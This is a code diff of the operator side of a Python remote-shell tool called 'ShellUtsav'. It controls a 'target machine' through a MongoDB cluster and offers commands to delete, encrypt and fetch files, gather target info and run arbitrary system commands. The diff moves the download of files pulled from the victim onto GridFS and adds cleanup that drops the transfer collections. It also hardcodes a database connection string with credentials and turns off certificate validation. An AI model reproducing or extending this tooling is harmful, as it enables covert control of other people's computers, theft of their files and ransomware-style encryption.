@@ -6,17 +6,21 @@ import requests
 from colorama import Fore,init
 import os
 import socket
+import gridfs
 
 MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
 MY_FAV_FOLDER='ShellUtsav'
 
 init(autoreset=True)
 
+
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
 client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
+
+fs=gridfs.GridFS(db)
 
 MY_COMMANDS=['dir --> target machine current directory contents','cd --> 1 step forward directory','cd.. --> 1 step backward directory','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system --> helps to perform any system command for windows']
 
@@ -27,6 +31,7 @@ IP=""
 PUBLIC_IP=""
 PREV_COMMAND=""
 SHELL_RESULT=False
+FILENAME=""
 
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
@@ -172,28 +177,43 @@ def clearCollection():
     try:
         col.delete_many(filters)
         col2.delete_one(another_filer)
+        list_coll=db.list_collection_names()
+        for i in list_coll:
+            if i=='fs.files':
+                col=db['fs.files']
+                col.drop()
+            if i=='fs.chunks':
+                coll=db['fs.chunks']
+                coll.drop()
     except Exception as e:
         print(e)
 
 
 def binaryContent():
-    global MY_FAV_ROOT,MY_FAV_FOLDER
+    global MY_FAV_ROOT,MY_FAV_FOLDER,FILENAME
     if not (os.path.exists(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")):
         os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
-    col=db['shellresult']
-    filters={
-            "hostname":TARGET
-        }
     while True:
-        res=col.find_one(filters)
-        if res:
-            data=(res['result'])
-            file_name=(res['filename'])
-            binary=data.encode('latin-1')
-            with open(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}"+f"\{file_name}",'wb') as f:
-                f.write(binary)
-            clearCollection()
-            break
+        data=db.fs.files.find_one({'filename':FILENAME})
+        if data:
+            try:
+                my_id=data['_id']
+                output=fs.get(my_id).read()
+                download_location=MY_FAV_ROOT+f"\{MY_FAV_FOLDER}\\"+FILENAME
+                out=open(download_location,'wb')
+                out.write(output)
+                out.close()
+                list_coll=db.list_collection_names()
+                for i in list_coll:
+                    if i=='fs.files':
+                        col=db['fs.files']
+                        col.drop()
+                    if i=='fs.chunks':
+                        coll=db['fs.chunks']
+                        coll.drop()
+                break
+            except:
+                pass
     
 
 def imageShow():
@@ -234,7 +254,7 @@ def is_directory_change_command():
 
 
 def ActionUploader():
-    global PREV_COMMAND,CWD,MY_COMMANDS
+    global PREV_COMMAND,CWD,MY_COMMANDS,FILENAME
     a= (PREV_COMMAND.split(" "))
     col=db['myshell']
     clearCollection()
@@ -282,6 +302,7 @@ def ActionUploader():
 
     elif a[0]=='getalltypefiles' and len(a)==2:
         target_element=a[1]
+        FILENAME=a[1]
         data={
                 "action":a[0],
                 "target":TARGET,
